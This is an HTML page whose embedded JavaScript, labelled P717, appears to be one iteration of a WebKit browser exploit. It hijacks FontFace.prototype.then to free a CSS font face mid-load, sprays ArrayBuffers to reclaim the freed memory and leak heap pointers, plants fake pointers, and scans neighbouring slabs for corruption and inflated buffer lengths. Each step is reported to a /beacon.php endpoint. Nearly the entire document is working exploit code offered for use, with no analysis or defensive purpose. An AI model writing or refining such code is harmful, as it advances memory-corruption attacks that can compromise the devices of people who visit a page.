<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P717 — In-Reclaim Sequential Slab Overlap Scout</title>
<script>
'use strict';
/* ============================================================
 * P717 — In-Reclaim Sequential Slab Overlap Scout
 *
 * Root Cause Analysis from P716:
 * - Pre-spraying buffers BEFORE doWinningReclaim() stole the freed
 *   slot P58 and filled it with non-pointer sentinels, causing a crash.
 * - Solution in P717: Allocate all 80 tracking buffers DIRECTLY inside
 *   FontFace.prototype.then with view[12]=P58 and view[6]=P58 on EVERY
 *   buffer, while uniquely tagging each buffer at q23 with its index k!
 *
 * Objectives of P717:
 * 1. 100% stable execution (matches P715's zero-crash formula).
 * 2. Uniquely track all 80 sequential FastMalloc slabs.
 * 3. Identify base index k_base that reclaimed P58.
 * 4. Inspect k_base + 20 (+0xF00 = +3,840B) and all adjacent slabs for
 *    WebKit's internal font data writes (q11 target).
 * 5. Check byteLengths across all 80 buffers.
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P717-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

function log(s){
  var el = document.getElementById('out');
  if(el) el.textContent += s + '\n';
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;
var ALL_VIEWS = [];

function run(){
  b('BOOT','p717-inreclaim-scout');
  log('=== P717 In-Reclaim Sequential Slab Overlap Scout ===\n');

  /* Step 1: Baseline Leak */
  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58 = 0x' + h16(P58));
    log('P68 = 0x' + h16(P68) + '\n');

    /* Step 2: In-Reclaim Tagged Spray */
    log('[Step 2] Executing in-reclaim tagged spray (80 buffers)...');
    doTaggedReclaim(function(){
      /* Step 3: Scan all 80 slabs for collision */
      log('\n[Step 3] Scanning all 80 slabs for WebKit q11 writes...');
      scanSlabs();
    });
  });
}

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove(); st.textContent=''; st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }

    if(best<0 || bestNz<4){
      b('LEAK-MISS','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    var v = new BigUint64Array(abs[best]);
    extractPointers(v);

    if(!P58){
      b('LEAK-NOPTR','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);

  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove(); st2.textContent=''; st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl1, lk1','CD');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }
    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
    var v = new BigUint64Array(abs2[best]);
    extractPointers(v);
    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb, 100);
  }, 400);
}

function extractPointers(v){
  var LOW = BigInt('0x1000000000');
  var HIGH = BigInt('0x80000000000');
  for(var q=0;q<24;q++){
    var val = v[q];
    if(val >= LOW && val < HIGH){
      if(!P58) P58 = val;
      else if(!P68 && val !== P58) P68 = val;
    }
  }
  if(!P68) P68 = 0n;
}

/* ---- Step 2: In-Reclaim Tagged Spray ---- */
function doTaggedReclaim(cb){
  b('RECLAIM-GO', 'fill_q12_q6=0x' + h16(P58));

  var stW = document.createElement('style');
  stW.textContent = '@font-face{font-family:winFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stW);

  FACE_B = new FontFace('winFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  var absW = [], firedW = false;
  ALL_VIEWS = [];

  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if(firedW) return undefined; firedW = true;
      if(stW){ stW.remove(); stW.textContent = ''; stW = null; }
      try{ document.fonts.delete(this); }catch(e){}
      document.body.offsetHeight;

      for(var k=0; k<80; k++){
        var ab = new ArrayBuffer(192);
        var view = new BigUint64Array(ab);
        view[12] = P58;  /* Safe anchor */
        view[6]  = P58;  /* Safe anchor */
        view[23] = BigInt('0xC000000000000000') | BigInt(k); /* Unique Tag */
        absW.push(ab);
        ALL_VIEWS.push({ ab: ab, view: view, k: k });
      }
      try{ document.fonts.check('1em winFam'); }catch(e){}
      return undefined;
    }, set: function(){}
  });

  document.fonts.load('1em winFace, winFam', 'GH');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for(var i=0; i<ALL_VIEWS.length; i++){
      var u = new Uint8Array(ALL_VIEWS[i].ab), nz = 0;
      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
      if(nz > bestNz){ bestNz = nz; best = i; }
    }

    if(best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'nz=' + bestNz);
      log('Reclaim missed!');
      return;
    }

    BUF_B = ALL_VIEWS[best].ab;
    VIEW_B = ALL_VIEWS[best].view;
    var baseK = ALL_VIEWS[best].k;

    var dumpStr = 'baseK=' + baseK + '|nz=' + bestNz +
                  '|q0=0x' + h16(VIEW_B[0]) + '|q11=0x' + h16(VIEW_B[11]) +
                  '|q12=0x' + h16(VIEW_B[12]) + '|q13=0x' + h16(VIEW_B[13]);
    b('RECLAIM-OK', dumpStr);
    log('Live Reclaim Succeeded: ' + dumpStr);

    setTimeout(cb, 100);
  }, 400);
}

/* ---- Step 3: Scan All Slabs ---- */
function scanSlabs(){
  var bestItem = null;
  for(var i=0; i<ALL_VIEWS.length; i++){
    if(ALL_VIEWS[i].ab === BUF_B){
      bestItem = ALL_VIEWS[i];
      break;
    }
  }

  var baseK = bestItem ? bestItem.k : -1;
  var targetK20 = baseK >= 0 ? baseK + 20 : -1;
  var touched = [];

  for(var i=0; i<ALL_VIEWS.length; i++){
    var item = ALL_VIEWS[i];
    if(item.ab === BUF_B) continue; /* Skip the primary CSSFontFace itself */

    var v = item.view;
    var mod = [];
    for(var q=0; q<24; q++){
      var exp = 0n;
      if(q === 6 || q === 12) exp = P58;
      else if(q === 23) exp = BigInt('0xC000000000000000') | BigInt(item.k);

      if(v[q] !== exp){
        mod.push('q' + q + '=0x' + h16(v[q]));
      }
    }

    if(mod.length > 0){
      touched.push('k' + item.k + '(' + mod.slice(0, 3).join(',') + ')');
    }
  }

  /* Check Buffer at k_base + 20 specifically */
  var k20Status = 'none';
  if(targetK20 >= 0 && targetK20 < ALL_VIEWS.length){
    var v20 = ALL_VIEWS[targetK20].view;
    k20Status = 'q0=0x' + h16(v20[0]) + '|q1=0x' + h16(v20[1]) + '|q11=0x' + h16(v20[11]);
  }

  var scanReport = 'baseK=' + baseK + '|k20=' + targetK20 + '|k20Stat=' + k20Status +
                   '|touchedCount=' + touched.length + '|touched=' + (touched.slice(0, 5).join(';') || 'none');
  b('SLAB-SCAN', scanReport);
  log('\nSlab Scan Report: ' + scanReport);

  /* Check byteLengths */
  var lenExp = [];
  for(var i=0; i<ALL_VIEWS.length; i++){
    if(ALL_VIEWS[i].ab.byteLength !== 192){
      lenExp.push('k' + ALL_VIEWS[i].k + ':len=' + ALL_VIEWS[i].ab.byteLength);
    }
  }

  if(lenExp.length > 0){
    b('LENGTH-EXPANDED', lenExp.join(';'));
    log('!!! ARRAYBUFFER EXPANDED: ' + lenExp.join(', '));
  } else {
    b('LENGTH-CHECK', 'all-80-normal-192B');
    log('All 80 ArrayBuffers confirmed at 192 bytes.');
  }

  b('DONE','p717-complete');
  log('\n=== P717 Complete! ===');
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
</head><body><pre id="out">P717 — Initializing In-Reclaim Slab Overlap Scout...</pre></body></html>
